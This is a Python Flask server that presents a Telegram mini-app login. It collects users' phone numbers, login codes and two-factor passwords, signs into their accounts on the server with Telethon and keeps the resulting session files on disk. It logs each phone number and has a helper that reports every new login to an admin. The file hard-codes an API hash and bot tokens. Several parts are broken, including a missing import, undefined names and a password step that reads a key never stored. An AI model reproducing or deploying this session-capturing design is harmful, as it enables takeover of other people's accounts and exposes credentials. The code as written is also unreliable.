import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon.sync import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError
)
from aiogram import Bot
from database import get_db, init_db

# ======================
# CONFIG
# ======================
API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"
BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"

ADMIN_ID = 515902673
ADMIN_BOT_TOKEN = "8455652640:AAE0Mf0haSpP_8yCjZTCKAqGQAcVF4kf02s"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


def send_admin_message(text: str):
    async def _send():
        await bot.send_message(ADMIN_ID, text)

    def runner():
        asyncio.run(_send())

    threading.Thread(target=runner, daemon=True).start()


bot = Bot(BOT_TOKEN)

app = Flask(__name__, template_folder="templates")

init_db()

# phone -> {client, hash}
pending = {}

def session_path(phone):
    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))

# ======================
# ROUTES
# ======================

@app.route("/")
def index():
    return "OK, LOGIN SERVER ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")

    try:
        async def work():
            client = TelegramClient(
                session_path(phone),
                API_ID,
                API_HASH
            )
            await client.connect()
            sent = await client.send_code_request(phone)
            await client.disconnect()

            pending[phone] = {
                "hash": sent.phone_code_hash
            }

        run_async(work())
        return jsonify({"status": "code_sent"})

    except FloodWaitError as e:
        return jsonify({"status": "flood_wait", "seconds": e.seconds})
    except PhoneNumberInvalidError:
        return jsonify({"status": "phone_invalid"})
    except Exception as e:
        print("SEND CODE ERROR:", e)
        return jsonify({"status": "error"})



@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if phone not in pending:
        return jsonify({"status": "no_code_requested"})

    phone_hash = pending[phone]["hash"]

    try:
        async def work():
            client = TelegramClient(
                session_path(phone),
                API_ID,
                API_HASH
            )
            await client.connect()

            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_hash
            )

            me = await client.get_me()
            await client.disconnect()
            return me

        me = run_async(work())
        pending.pop(phone, None)

        # 🔽 DB GA YOZISH
        user_id = str(me.id)
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id)
            VALUES (%s)
            ON CONFLICT (user_id) DO NOTHING
        """, (user_id,))
        conn.commit()
        conn.close()

        return jsonify({"status": "success"})

    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_required"})
    except PhoneCodeInvalidError:
        return jsonify({"status": "invalid_code"})
    except Exception as e:
        print("VERIFY CODE ERROR:", e)
        return jsonify({"status": "error"})


@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    if phone not in pending:
        return jsonify({"status": "no_session"})

    client = pending[phone]["client"]

    try:
        client.sign_in(password=password)
    except Exception:
        return jsonify({"status": "invalid_password"})

    return finalize_login(client, phone)

# ======================
# FINAL LOGIN
# ======================

def finalize_login(client, phone):
    me = client.get_me()
    user_id = str(me.id)

    conn = get_db()
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO authorized_users (user_id, phone)
        VALUES (%s, %s)
        ON CONFLICT (user_id)
        DO UPDATE SET phone = EXCLUDED.phone
    """, (user_id, phone))
    conn.commit()
    conn.close()

    client.disconnect()
    pending.pop(phone, None)

    return jsonify({"status": "success"})

def notify_admin(user_id: str, phone: str, username: str | None = None):
    async def _send():
        text = (
            "🔐 Yangi login\n\n"
            f"👤 User ID: {user_id}\n"
            f"📱 Phone: {phone}\n"
        )
        if username:
            text += f"👤 Username: @{username}"

        await admin_bot.send_message(ADMIN_CHAT_ID, text)

    def runner():
        asyncio.run(_send())

    threading.Thread(target=runner, daemon=True).start()


# ======================
# RUN
# ======================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)









